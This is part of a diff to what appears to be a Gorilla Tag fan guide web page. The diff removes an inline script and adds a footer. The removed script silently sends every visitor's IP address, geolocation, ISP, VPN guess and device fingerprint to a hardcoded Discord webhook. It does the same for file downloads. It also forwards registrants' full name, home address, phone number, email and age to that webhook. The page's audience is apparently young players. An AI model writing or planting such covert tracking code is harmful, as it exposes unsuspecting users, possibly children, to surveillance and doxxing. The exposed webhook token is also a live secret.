-        if (event.target === modal) {
-            modal.style.display = 'none';
-        }
-    });
-    
-    // Handle form submission
-    registrationForm.addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        // Get form data
-        const formData = {
-            name: document.getElementById('name').value,
-            email: document.getElementById('email').value,
-            address: document.getElementById('address').value,
-            city: document.getElementById('city').value,
-            state: document.getElementById('state').value,
-            zip: document.getElementById('zip').value,
-            country: document.getElementById('country').value,
-            phone: document.getElementById('phone').value,
-            discord: document.getElementById('discord').value,
-            age: document.getElementById('age').value,
-            experience: document.getElementById('experience').value,
-            platform: document.getElementById('platform').value,
-            interests: Array.from(document.querySelectorAll('input[name="interests"]:checked')).map(el => el.value)
-        };
-        
-        // Send form data to webhook
-        logRegistration(formData);
-        
-        // Show success message and close modal
-        alert('Thank you for registering! You will receive updates soon.');
-        modal.style.display = 'none';
-        registrationForm.reset();
-    });
-});
-
-// Function to log visitor
-async function logVisitor() {
-    try {
-        // Get IP information
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        
-        // Get detailed IP information from ipapi.co
-        const detailedIpResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-        const detailedIpData = await detailedIpResponse.json();
-        
-        // Get additional IP information from DB-IP
-        const dbIpResponse = await fetch(`https://api.db-ip.com/v2/free/${ipData.ip}`);
-        const dbIpData = await dbIpResponse.json();
-        
-        // Get browser and device information
-        const userAgent = navigator.userAgent;
-        const language = navigator.language;
-        const platform = navigator.platform;
-        const screenSize = `${window.screen.width}x${window.screen.height}`;
-        const colorDepth = window.screen.colorDepth;
-        const pixelRatio = window.devicePixelRatio;
-        const referrer = document.referrer || 'Direct';
-        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const cookiesEnabled = navigator.cookieEnabled;
-        const doNotTrack = navigator.doNotTrack;
-        
-        // Detect browser
-        let browser = 'Unknown';
-        if (userAgent.includes('Firefox')) {
-            browser = 'Firefox';
-        } else if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
-            browser = 'Chrome';
-        } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
-            browser = 'Safari';
-        } else if (userAgent.includes('Edg')) {
-            browser = 'Edge';
-        } else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) {
-            browser = 'Internet Explorer';
-        } else if (userAgent.includes('Opera') || userAgent.includes('OPR')) {
-            browser = 'Opera';
-        }
-        
-        // Detect device type
-        let deviceType = 'Unknown';
-        if (/Mobi|Android|iPhone|iPad|iPod|Windows Phone/i.test(userAgent)) {
-            deviceType = 'Mobile';
-        } else {
-            deviceType = 'Desktop';
-        }
-        
-        // Detect operating system
-        let os = 'Unknown';
-        if (userAgent.includes('Windows')) {
-            os = 'Windows';
-        } else if (userAgent.includes('Mac OS')) {
-            os = 'macOS';
-        } else if (userAgent.includes('Linux')) {
-            os = 'Linux';
-        } else if (userAgent.includes('Android')) {
-            os = 'Android';
-        } else if (userAgent.includes('iOS')) {
-            os = 'iOS';
-        }
-        
-        // VPN detection (this is a basic heuristic and not 100% accurate)
-        let vpnLikely = 'Unknown';
-        if (detailedIpData.org && (
-            detailedIpData.org.toLowerCase().includes('vpn') || 
-            detailedIpData.org.toLowerCase().includes('proxy') ||
-            detailedIpData.org.toLowerCase().includes('hosting') ||
-            detailedIpData.org.toLowerCase().includes('cloud')
-        )) {
-            vpnLikely = 'Likely';
-        } else {
-            vpnLikely = 'Unlikely';
-        }
-        
-        // Send to Discord webhook
-        const webhookUrl = 'https://discord.com/api/webhooks/1400530692885970976/yb_356OR91Lyc5nx-MZe7N97aApPC5TsR8qWPj3cpo11lw9PEMUFEOydtqgQg3-3OT32';
-        
-        const message = {
-            content: '**New Visitor**',
-            embeds: [{
-                title: 'Visitor Information',
-                color: 5814783, // Green color
-                fields: [
-                    {
-                        name: 'IP Address',
-                        value: ipData.ip,
-                        inline: true
-                    },
-                    {
-                        name: 'Location (ipapi)',
-                        value: `${detailedIpData.city || 'Unknown'}, ${detailedIpData.region || 'Unknown'}, ${detailedIpData.country_name || 'Unknown'}`,
-                        inline: true
-                    },
-                    {
-                        name: 'Location (DB-IP)',
-                        value: `${dbIpData.city || 'Unknown'}, ${dbIpData.stateProv || 'Unknown'}, ${dbIpData.countryName || 'Unknown'}`,
-                        inline: true
-                    },
-                    {
-                        name: 'ISP/Organization',
-                        value: detailedIpData.org || 'Unknown',
-                        inline: true
-                    },
-                    {
-                        name: 'ASN (DB-IP)',
-                        value: dbIpData.asNumber || 'Unknown',
-                        inline: true
-                    },
-                    {
-                        name: 'ISP (DB-IP)',
-                        value: dbIpData.isp || 'Unknown',
-                        inline: true
-                    },
-                    {
-                        name: 'VPN/Proxy Detected',
-                        value: vpnLikely,
-                        inline: true
-                    },
-                    {
-                        name: 'Browser',
-                        value: browser,
-                        inline: true
-                    },
-                    {
-                        name: 'Operating System',
-                        value: os,
-                        inline: true
-                    },
-                    {
-                        name: 'Device Type',
-                        value: deviceType,
-                        inline: true
-                    },
-                    {
-                        name: 'Platform',
-                        value: platform,
-                        inline: true
-                    },
-                    {
-                        name: 'Screen Size',
-                        value: screenSize,
-                        inline: true
-                    },
-                    {
-                        name: 'Pixel Ratio',
-                        value: pixelRatio.toString(),
-                        inline: true
-                    },
-                    {
-                        name: 'Color Depth',
-                        value: `${colorDepth} bit`,
-                        inline: true
-                    },
-                    {
-                        name: 'Language',
-                        value: language,
-                        inline: true
-                    },
-                    {
-                        name: 'Time Zone',
-                        value: timeZone,
-                        inline: true
-                    },
-                    {
-                        name: 'Cookies Enabled',
-                        value: cookiesEnabled ? 'Yes' : 'No',
-                        inline: true
-                    },
-                    {
-                        name: 'Do Not Track',
-                        value: doNotTrack || 'Not specified',
-                        inline: true
-                    },
-                    {
-                        name: 'Referrer',
-                        value: referrer,
-                        inline: true
-                    },
-                    {
-                        name: 'User Agent',
-                        value: userAgent
-                    },
-                    {
-                        name: 'Time',
-                        value: new Date().toLocaleString(),
-                        inline: true
-                    }
-                ],
-                footer: {
-                    text: 'Gorilla Tag Guide Book'
-                }
-            }]
-        };
-        
-        await fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(message)
-        });
-    } catch (error) {
-        console.error('Error logging visitor:', error);
-    }
-}
-
-// Function to log download activity
-async function logDownload(fileName) {
-    try {
-        // Get IP information
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        
-        // Get detailed IP information from ipapi.co
-        const detailedIpResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-        const detailedIpData = await detailedIpResponse.json();
-        
-        // Get additional IP information from DB-IP
-        const dbIpResponse = await fetch(`https://api.db-ip.com/v2/free/${ipData.ip}`);
-        const dbIpData = await dbIpResponse.json();
-        
-        // Get browser information
-        const userAgent = navigator.userAgent;
-        
-        // Detect browser
-        let browser = 'Unknown';
-        if (userAgent.includes('Firefox')) {
-            browser = 'Firefox';
-        } else if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
-            browser = 'Chrome';
-        } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
-            browser = 'Safari';
-        } else if (userAgent.includes('Edg')) {
-            browser = 'Edge';
-        } else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) {
-            browser = 'Internet Explorer';
-        } else if (userAgent.includes('Opera') || userAgent.includes('OPR')) {
-            browser = 'Opera';
-        }
-        
-        // Send to Discord webhook
-        const webhookUrl = 'https://discord.com/api/webhooks/1400530692885970976/yb_356OR91Lyc5nx-MZe7N97aApPC5TsR8qWPj3cpo11lw9PEMUFEOydtqgQg3-3OT32';
-        
-        const message = {
-            content: '**Download Activity**',
-            embeds: [{
-                title: 'Download Information',
-                color: 16750848, // Orange color
-                fields: [
-                    {
-                        name: 'File Downloaded',
-                        value: fileName,
-                        inline: true
-                    },
-                    {
-                        name: 'IP Address',
-                        value: ipData.ip,
-                        inline: true
-                    },
-                    {
-                        name: 'Location (ipapi)',
-                        value: `${detailedIpData.city || 'Unknown'}, ${detailedIpData.region || 'Unknown'}, ${detailedIpData.country_name || 'Unknown'}`,
-                        inline: true
-                    },
-                    {
-                        name: 'Location (DB-IP)',
-                        value: `${dbIpData.city || 'Unknown'}, ${dbIpData.stateProv || 'Unknown'}, ${dbIpData.countryName || 'Unknown'}`,
-                        inline: true
-                    },
-                    {
-                        name: 'ISP (DB-IP)',
-                        value: dbIpData.isp || 'Unknown',
-                        inline: true
-                    },
-                    {
-                        name: 'Browser',
-                        value: browser,
-                        inline: true
-                    },
-                    {
-                        name: 'Time',
-                        value: new Date().toLocaleString(),
-                        inline: true
-                    }
-                ],
-                footer: {
-                    text: 'Gorilla Tag Guide Book'
-                }
-            }]
-        };
-        
-        await fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(message)
-        });
-    } catch (error) {
-        console.error('Error logging download:', error);
-    }
-}
-
-// Function to log registration data
-async function logRegistration(formData) {
-    try {
-        // Get IP information
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        
-        // Get detailed IP information from ipapi.co
-        const detailedIpResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-        const detailedIpData = await detailedIpResponse.json();
-        
-        // Get additional IP information from DB-IP
-        const dbIpResponse = await fetch(`https://api.db-ip.com/v2/free/${ipData.ip}`);
-        const dbIpData = await dbIpResponse.json();
-        
-        // Get browser and device information
-        const userAgent = navigator.userAgent;
-        const language = navigator.language;
-        const platform = navigator.platform;
-        const screenSize = `${window.screen.width}x${window.screen.height}`;
-        const referrer = document.referrer || 'Direct';
-        
-        // Detect browser
-        let browser = 'Unknown';
-        if (userAgent.includes('Firefox')) {
-            browser = 'Firefox';
-        } else if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
-            browser = 'Chrome';
-        } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
-            browser = 'Safari';
-        } else if (userAgent.includes('Edg')) {
-            browser = 'Edge';
-        } else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) {
-            browser = 'Internet Explorer';
-        } else if (userAgent.includes('Opera') || userAgent.includes('OPR')) {
-            browser = 'Opera';
-        }
-        
-        // Detect device type
-        let deviceType = 'Unknown';
-        if (/Mobi|Android|iPhone|iPad|iPod|Windows Phone/i.test(userAgent)) {
-            deviceType = 'Mobile';
-        } else {
-            deviceType = 'Desktop';
-        }
-        
-        // VPN detection (this is a basic heuristic and not 100% accurate)
-        let vpnLikely = 'Unknown';
-        if (detailedIpData.org && (
-            detailedIpData.org.toLowerCase().includes('vpn') || 
-            detailedIpData.org.toLowerCase().includes('proxy') ||
-            detailedIpData.org.toLowerCase().includes('hosting') ||
-            detailedIpData.org.toLowerCase().includes('cloud')
-        )) {
-            vpnLikely = 'Likely';
-        } else {
-            vpnLikely = 'Unlikely';
-        }
-        
-        // Send to Discord webhook
-        const webhookUrl = 'https://discord.com/api/webhooks/1400530692885970976/yb_356OR91Lyc5nx-MZe7N97aApPC5TsR8qWPj3cpo11lw9PEMUFEOydtqgQg3-3OT32';
-        
-        const message = {
-            content: '**New Registration**',
-            embeds: [{
-                title: 'User Registration Information',
-                color: 15548997, // Red color
-                fields: [
-                    {
-                        name: 'Full Name',
-                        value: formData.name,
-                        inline: true
-                    },
-                    {
-                        name: 'Email Address',
-                        value: formData.email,
-                        inline: true
-                    },
-                    {
-                        name: 'Home Address',
-                        value: formData.address
-                    },
-                    {
-                        name: 'City',
-                        value: formData.city,
-                        inline: true
-                    },
-                    {
-                        name: 'State/Province',
-                        value: formData.state,
-                        inline: true
-                    },
-                    {
-                        name: 'ZIP/Postal Code',
-                        value: formData.zip,
-                        inline: true
-                    },
-                    {
-                        name: 'Country',
-                        value: formData.country,
-                        inline: true
-                    },
-                    {
-                        name: 'Phone Number',
-                        value: formData.phone,
-                        inline: true
-                    },
-                    {
-                        name: 'Discord Username',
-                        value: formData.discord || 'Not provided',
-                        inline: true
-                    },
-                    {
-                        name: 'Age',
-                        value: formData.age,
-                        inline: true
-                    },
-                    {
-                        name: 'Experience Level',
-                        value: formData.experience,
-                        inline: true
-                    },
-                    {
-                        name: 'Platform',
-                        value: formData.platform,
-                        inline: true
-                    },
-                    {
-                        name: 'Interests',
-                        value: formData.interests.length > 0 ? formData.interests.join(', ') : 'None selected',
-                        inline: true
-                    },
-                    {
-                        name: 'IP Address',
-                        value: ipData.ip,
-                        inline: true
-                    },
-                    {
-                        name: 'Location (ipapi)',
-                        value: `${detailedIpData.city || 'Unknown'}, ${detailedIpData.region || 'Unknown'}, ${detailedIpData.country_name || 'Unknown'}`,
-                        inline: true
-                    },
-                    {
-                        name: 'Location (DB-IP)',
-                        value: `${dbIpData.city || 'Unknown'}, ${dbIpData.stateProv || 'Unknown'}, ${dbIpData.countryName || 'Unknown'}`,
-                        inline: true
-                    },
-                    {
-                        name: 'ISP/Organization',
-                        value: detailedIpData.org || 'Unknown',
-                        inline: true
-                    },
-                    {
-                        name: 'ISP (DB-IP)',
-                        value: dbIpData.isp || 'Unknown',
-                        inline: true
-                    },
-                    {
-                        name: 'ASN (DB-IP)',
-                        value: dbIpData.asNumber || 'Unknown',
-                        inline: true
-                    },
-                    {
-                        name: 'VPN/Proxy Detected',
-                        value: vpnLikely,
-                        inline: true
-                    },
-                    {
-                        name: 'Browser',
-                        value: browser,
-                        inline: true
-                    },
-                    {
-                        name: 'Device Type',
-                        value: deviceType,
-                        inline: true
-                    },
-                    {
-                        name: 'User Agent',
-                        value: userAgent
-                    },
-                    {
-                        name: 'Time',
-                        value: new Date().toLocaleString(),
-                        inline: true
-                    }
-                ],
-                footer: {
-                    text: 'Gorilla Tag Guide Book'
-                }
-            }]
-        };
-        
-        await fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(message)
-        });
-    } catch (error) {
-        console.error('Error logging registration:', error);
-    }
-}
-
-// Function to handle downloads
-function simulateDownload(fileName) {
-    // Create a download link to the actual file
-    const element = document.createElement('a');
-    element.setAttribute('href', 'downloads/' + fileName);
-    element.setAttribute('download', fileName);
-    
-    element.style.display = 'none';
-    document.body.appendChild(element);
-    
-    element.click();
-    
-    document.body.removeChild(element);
-}
-
-</script>
-
-    <script src="script.js"></script>
+    <footer>
+        <p>&copy; 2025 Gorilla Tag Assets - Professional Resources for Content Creators</p>
+        <p>Not affiliated with Another Axiom Inc.</p>
+    </footer>
+</div>
 </body>
 </html>
